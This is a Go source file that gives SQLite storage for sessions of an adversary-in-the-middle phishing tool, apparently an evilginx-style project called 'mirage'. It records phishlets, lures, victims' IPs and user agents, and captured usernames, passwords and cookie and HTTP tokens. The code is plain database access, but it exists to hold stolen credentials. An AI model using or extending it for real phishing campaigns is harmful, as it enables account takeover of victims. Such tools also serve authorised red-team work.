package sqlite

import (
	"database/sql"
	"fmt"
	"strings"
	"time"

	"github.com/travisbale/mirage/aitm"
	"github.com/travisbale/mirage/store"
)

// Compile-time check: Sessions satisfies aitm.SessionStore.
var _ aitm.SessionStore = (*Sessions)(nil)

// Sessions implements aitm.SessionStore backed by SQLite.
type Sessions struct{ db *DB }

func NewSessions(db *DB) *Sessions { return &Sessions{db: db} }

func (s *Sessions) CreateSession(sess *aitm.Session) error {
	custom, err := marshalJSON(sess.Custom)
	if err != nil {
		return err
	}
	cookies, err := marshalJSON(sess.CookieTokens)
	if err != nil {
		return err
	}
	body, err := marshalJSON(sess.BodyTokens)
	if err != nil {
		return err
	}
	httpTok, err := marshalJSON(sess.HttpTokens)
	if err != nil {
		return err
	}
	var completedAt *int64
	if sess.CompletedAt != nil {
		t := sess.CompletedAt.Unix()
		completedAt = &t
	}
	_, err = s.db.db.Exec(`
		INSERT INTO sessions
			(id, phishlet, lure_id, remote_addr, user_agent, ja4_hash,
			 bot_score, username, password, custom, cookie_tokens, body_tokens,
			 http_tokens, puppet_id, started_at, completed_at)
		VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
		sess.ID, sess.Phishlet, sess.LureID, sess.RemoteAddr, sess.UserAgent,
		sess.JA4Hash, sess.BotScore, sess.Username, sess.Password,
		custom, cookies, body, httpTok, sess.PuppetID,
		sess.StartedAt.Unix(), completedAt,
	)
	if isConflict(err) {
		return store.ErrConflict
	}
	return err
}

func (s *Sessions) GetSession(id string) (*aitm.Session, error) {
	row := s.db.db.QueryRow(`SELECT
		id, phishlet, lure_id, remote_addr, user_agent, ja4_hash,
		bot_score, username, password, custom, cookie_tokens, body_tokens,
		http_tokens, puppet_id, started_at, completed_at
		FROM sessions WHERE id = ?`, id)
	sess, err := scanSession(row)
	if err == sql.ErrNoRows {
		return nil, store.ErrNotFound
	}
	return sess, err
}

func (s *Sessions) UpdateSession(sess *aitm.Session) error {
	custom, _ := marshalJSON(sess.Custom)
	cookies, _ := marshalJSON(sess.CookieTokens)
	body, _ := marshalJSON(sess.BodyTokens)
	httpTok, _ := marshalJSON(sess.HttpTokens)
	var completedAt *int64
	if sess.CompletedAt != nil {
		t := sess.CompletedAt.Unix()
		completedAt = &t
	}
	res, err := s.db.db.Exec(`
		UPDATE sessions SET
			phishlet=?, lure_id=?, remote_addr=?, user_agent=?, ja4_hash=?,
			bot_score=?, username=?, password=?, custom=?, cookie_tokens=?,
			body_tokens=?, http_tokens=?, puppet_id=?, started_at=?, completed_at=?
		WHERE id=?`,
		sess.Phishlet, sess.LureID, sess.RemoteAddr, sess.UserAgent, sess.JA4Hash,
		sess.BotScore, sess.Username, sess.Password,
		custom, cookies, body, httpTok, sess.PuppetID,
		sess.StartedAt.Unix(), completedAt, sess.ID,
	)
	if err != nil {
		return err
	}
	return requireOneRow(res)
}

func (s *Sessions) DeleteSession(id string) error {
	res, err := s.db.db.Exec(`DELETE FROM sessions WHERE id = ?`, id)
	if err != nil {
		return err
	}
	return requireOneRow(res)
}

func (s *Sessions) ListSessions(f aitm.SessionFilter) ([]*aitm.Session, error) {
	if f.CompletedOnly && f.IncompleteOnly {
		return nil, store.ErrInvalidFilter
	}

	var where []string
	var args []any

	if f.Phishlet != "" {
		where = append(where, "phishlet = ?")
		args = append(args, f.Phishlet)
	}
	if f.CompletedOnly {
		where = append(where, "completed_at IS NOT NULL")
	}
	if f.IncompleteOnly {
		where = append(where, "completed_at IS NULL")
	}
	if !f.After.IsZero() {
		where = append(where, "started_at > ?")
		args = append(args, f.After.Unix())
	}
	if !f.Before.IsZero() {
		where = append(where, "started_at < ?")
		args = append(args, f.Before.Unix())
	}

	q := `SELECT id, phishlet, lure_id, remote_addr, user_agent, ja4_hash,
		bot_score, username, password, custom, cookie_tokens, body_tokens,
		http_tokens, puppet_id, started_at, completed_at FROM sessions`
	if len(where) > 0 {
		q += " WHERE " + strings.Join(where, " AND ")
	}
	q += " ORDER BY started_at DESC"
	if f.Limit > 0 {
		q += fmt.Sprintf(" LIMIT %d", f.Limit)
	}
	if f.Offset > 0 {
		q += fmt.Sprintf(" OFFSET %d", f.Offset)
	}

	rows, err := s.db.db.Query(q, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var out []*aitm.Session
	for rows.Next() {
		sess, err := scanSession(rows)
		if err != nil {
			return nil, err
		}
		out = append(out, sess)
	}
	return out, rows.Err()
}

func scanSession(row scanner) (*aitm.Session, error) {
	var (
		sess        aitm.Session
		startedAt   int64
		completedAt *int64
		custom      string
		cookies     string
		body        string
		httpTok     string
	)
	err := row.Scan(
		&sess.ID, &sess.Phishlet, &sess.LureID, &sess.RemoteAddr, &sess.UserAgent,
		&sess.JA4Hash, &sess.BotScore, &sess.Username, &sess.Password,
		&custom, &cookies, &body, &httpTok, &sess.PuppetID,
		&startedAt, &completedAt,
	)
	if err != nil {
		return nil, err
	}
	sess.StartedAt = time.Unix(startedAt, 0)
	if completedAt != nil {
		t := time.Unix(*completedAt, 0)
		sess.CompletedAt = &t
	}
	_ = unmarshalJSON(custom, &sess.Custom)
	_ = unmarshalJSON(cookies, &sess.CookieTokens)
	_ = unmarshalJSON(body, &sess.BodyTokens)
	_ = unmarshalJSON(httpTok, &sess.HttpTokens)
	return &sess, nil
}
